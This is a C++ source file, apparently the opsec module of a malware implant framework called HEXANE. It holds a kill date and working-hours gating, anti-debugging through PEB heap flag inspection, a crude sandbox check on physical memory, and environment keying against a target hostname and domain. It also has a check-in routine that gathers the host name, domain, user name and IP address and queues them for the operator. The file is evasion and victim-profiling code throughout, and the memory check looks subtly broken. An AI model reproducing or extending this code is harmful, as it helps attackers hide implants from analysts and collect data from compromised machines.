#include <core/include/opsec.hpp>
using namespace Utils;
using namespace Stream;
using namespace Random;
using namespace Message;
using namespace Commands;

BOOL CheckTime () {
    HEXANE

    if (Ctx->Config.Killdate != 0) {
        if (GetTimeNow() >= Ctx->Config.Killdate) {
            Shutdown(nullptr);
        }
    }

    if (Ctx->Config.WorkingHours != 0) {
        if (!InWorkingHours()) {
            return FALSE;
        }
    }

    return TRUE;
}

VOID SeCheckDebugger() {
    HEXANE

    BOOL m_x32 					= FALSE;
    PPEB pPeb 					= PEB_POINTER;
    PVOID pHeapBase 			= nullptr;
    DWORD HeapFlagsOffset 		= 0;
    DWORD HeapForceFlagsOffset 	= 0;
    BOOL VistaOrGreater 		= Ctx->Session.OSVersion >= WIN_VERSION_2008;

    Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);

#ifndef _M_AMD64
    pHeapBase = !m_x32
                ? C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x18))
                : C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x1030));

    HeapFlagsOffset 		= VistaOrGreater ? 0x40 : 0x0C;
    HeapForceFlagsOffset 	= VistaOrGreater ? 0x44 : 0x10;
#else
    pHeapBase = C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x30));
    HeapFlagsOffset 		= VistaOrGreater ? 0x70 : 0x14;
    HeapForceFlagsOffset 	= VistaOrGreater ? 0x74 : 0x18;
#endif
    auto HeapFlags 		= (PDWORD)(B_PTR(pHeapBase) + HeapFlagsOffset);
    auto HeapForceFlags = (PDWORD)(B_PTR(pHeapBase) + HeapForceFlagsOffset);

    ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0))
    ? ntstatus = (ERROR_DEVICE_ALREADY_ATTACHED)
    : ntstatus = (ERROR_SUCCESS);
}

VOID SeCheckSandbox() { // check ACPI tables for vm vendors instead of just checking memory
    HEXANE

    MEMORYSTATUSEX stats = { };
    stats.dwLength = sizeof(stats);

    Ctx->win32.GlobalMemoryStatusEx(&stats);

    (stats.ullAvailPhys <= 4)
    ? ntstatus = (ERROR_NOT_ENOUGH_MEMORY)
    : ntstatus = (ERROR_SUCCESS);
}

VOID SeCheckEnvironment() {
    HEXANE

    PSTREAM Outbound 			= CreateStreamWithHeaders(TypeCheckin);
    PIP_ADAPTER_INFO adapter	= { };
    PCHAR buffer 				= { };
    DWORD length 				= 0;

    if (!Outbound) {
        return_defer(ERROR_NO_DATA);
    }

    if (!Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
        buffer = (PCHAR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length);

        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {

            if (GetHashFromStringA(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != GetHashFromStringA(buffer, x_strlen(buffer))) {
                return_defer(ERROR_BAD_ENVIRONMENT);
            }
            PackString(Outbound, buffer);
        } else {
            PackDword(Outbound, 0);
        }

        ZeroFreePtr(buffer, length);
    }

    length = 0;
    if (Ctx->Config.Domain[0] != NULTERM) {

        if (!Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
            buffer = (PCHAR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length);

            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {

                if (GetHashFromStringA(Ctx->Config.Domain, x_strlen(Ctx->Config.Domain)) != GetHashFromStringA(buffer, x_strlen(buffer))) {
                    return_defer(ERROR_BAD_ENVIRONMENT);
                }
                PackString(Outbound, buffer);
            } else {
                PackDword(Outbound, 0);
            }

            ZeroFreePtr(buffer, length);
        }
    } else {
        PackDword(Outbound, 0);
    }

    length = 0;
    if (!Ctx->win32.GetUserNameA(buffer, &length)) {
        buffer = (PCHAR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length);

        if (Ctx->win32.GetUserNameA(buffer, &length)) {
            PackString(Outbound, buffer);
        } else {
            PackDword(Outbound, 0);
        }

        ZeroFreePtr(buffer, length);
    }

    length = 0;
    if (Ctx->win32.GetAdaptersInfo(adapter, &length)) {
        adapter = (PIP_ADAPTER_INFO) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length);

        if (Ctx->win32.GetAdaptersInfo(adapter, &length) == NO_ERROR) {
            PackString(Outbound, adapter->IpAddressList.IpAddress.String);
        } else {
            PackDword(Outbound, 0);
        }

        ZeroFreePtr(adapter, length);
    }

    OutboundQueue(Outbound);

    defer:
    return;
}

VOID SeImageCheck(PIMAGE img, PIMAGE proc) {
    HEXANE

    if (proc->ntHead->FileHeader.Machine != img->ntHead->FileHeader.Machine) {
        ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
        return;
    }
    if (proc->ntHead->OptionalHeader.Subsystem != img->ntHead->OptionalHeader.Subsystem) {
        ntstatus = ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT;
    }
}

VOID SleepObf() {
    Timeout(RandomSleepTime());
}
